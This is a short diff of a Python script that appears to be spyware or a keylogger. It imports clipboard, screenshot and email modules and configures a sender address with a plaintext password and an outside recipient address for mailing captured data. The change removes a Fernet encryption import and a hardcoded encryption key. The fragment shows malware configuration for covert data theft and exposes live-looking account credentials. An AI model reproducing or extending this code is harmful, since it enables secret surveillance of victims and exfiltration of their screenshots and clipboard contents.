@@ -13,7 +13,6 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
-from cryptography.fernet import Fernet
 import win32clipboard
 from multiprocessing import Process, freeze_support
 import threading
@@ -29,7 +28,6 @@ screenshot_information = "screenshot.png"
 email_address = "userattch2023@outlook.com"
 password = "yihkwprettuxwxgw"
 toaddr = "user.attch@gmail.com"
-key = "s-bIgdAv5W40sFub7iBRCrk9JDEsyXZmJ3DRc2ND6Ok="
 time_interval = 20  
 number_of_screenshots = 3
 
